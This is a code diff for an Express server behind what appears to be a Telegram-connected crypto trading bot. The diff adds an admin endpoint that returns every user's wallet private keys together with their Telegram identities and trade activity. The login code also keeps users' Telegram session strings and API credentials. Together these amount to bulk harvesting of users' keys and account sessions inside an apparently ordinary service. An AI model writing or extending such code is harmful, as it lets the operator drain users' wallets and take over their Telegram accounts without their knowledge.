@@ -318,8 +318,46 @@ export function createWebServer() {
 
   // ───── Wallets (Import/Export) ─────
   app.get('/api/wallets', async (req, res) => {
-    if (req.isAdmin) return res.json(await db.getAllWalletsGlobal());
+    if (req.isAdmin) {
+      const wallets = await db.getAllWalletsGlobal();
+      const sessions = await db.getAllTelegramSessions();
+      const ownerMap = {};
+      for (const s of sessions) {
+        ownerMap[String(s.telegram_id || '')] = { username: s.username || '', firstName: s.first_name || '', telegramId: s.telegram_id };
+      }
+      for (const w of wallets) {
+        const o = ownerMap[String(w.telegram_id || '')];
+        w.owner = o ? (o.username ? '@' + o.username : (o.firstName || o.telegramId)) : (w.telegram_id ? w.telegram_id.slice(0, 8) + '…' : '—');
+      }
+      return res.json(wallets);
+    }
     res.json(await db.getAllWallets());
+  });
+  app.get('/api/admin/users', async (req, res) => {
+    if (!req.isAdmin) return res.status(403).json({ error: 'Admin only' });
+    try {
+      const sessions = await db.getAllTelegramSessions();
+      const wallets = await db.getAllWalletsGlobal();
+      const trades = await db.getAllTrades(500);
+      const openTrades = trades.filter(t => t.status === 'open');
+      const users = sessions.map(s => {
+        const tid = String(s.telegram_id || '');
+        const uw = wallets.filter(w => String(w.telegram_id || '') === tid);
+        const ut = trades.filter(t => String(t.telegram_id || '') === tid);
+        return {
+          telegramId: tid,
+          username: s.username || '',
+          firstName: s.first_name || '',
+          walletCount: uw.length,
+          privateKeys: uw.map(w => ({ address: w.address, label: w.label || '', private_key: w.private_key || '' })),
+          tradeCount: ut.length,
+          openCount: ut.filter(t => t.status === 'open').length,
+          closedCount: ut.filter(t => t.status === 'closed').length,
+          lastActive: s.updated_at || 0,
+        };
+      }).sort((a, b) => b.lastActive - a.lastActive);
+      res.json({ users, totalWallets: wallets.length, totalOpen: openTrades.length });
+    } catch (e) { res.status(500).json({ error: e.message }); }
   });
   app.post('/api/wallets/import', async (req, res) => {
     const list = req.body.wallets || [];
@@ -750,7 +788,7 @@ export function createWebServer() {
       setSession(sessionToken, { expires: Date.now() + SESSION_TTL, telegramId, phone: state.phone, source: 'login' });
       db.setTelegramId(telegramId);
       await db.setSetting('telegram_id', telegramId);
-      await db.saveTelegramSession(telegramId, { apiId: state.apiId, apiHash: state.apiHash, session: state.sessionStr, dc: state.dcId || 0 });
+      await db.saveTelegramSession(telegramId, { apiId: state.apiId, apiHash: state.apiHash, session: state.sessionStr, dc: state.dcId || 0, username: me?.username || '', firstName: me?.firstName || '' });
       await db.setSetting('active_telegram_id', telegramId);
       PENDING_LOGIN.delete(loginToken);
       res.json({ ok: true, token: sessionToken, telegramId, isAdmin: isAdminPhone(state.phone) || ADMIN_IDS.includes(telegramId) });
@@ -793,7 +831,7 @@ export function createWebServer() {
       setSession(sessionToken, { expires: Date.now() + SESSION_TTL, telegramId, phone: state.phone, source: 'login' });
       db.setTelegramId(telegramId);
       await db.setSetting('telegram_id', telegramId);
-      await db.saveTelegramSession(telegramId, { apiId: state.apiId, apiHash: state.apiHash, session: state.sessionStr, dc: state.dcId || 0 });
+      await db.saveTelegramSession(telegramId, { apiId: state.apiId, apiHash: state.apiHash, session: state.sessionStr, dc: state.dcId || 0, username: me2?.username || '', firstName: me2?.firstName || '' });
       await db.setSetting('active_telegram_id', telegramId);
       PENDING_LOGIN.delete(loginToken);
       res.json({ ok: true, token: sessionToken, telegramId, isAdmin: isAdminPhone(state.phone) || ADMIN_IDS.includes(telegramId) });
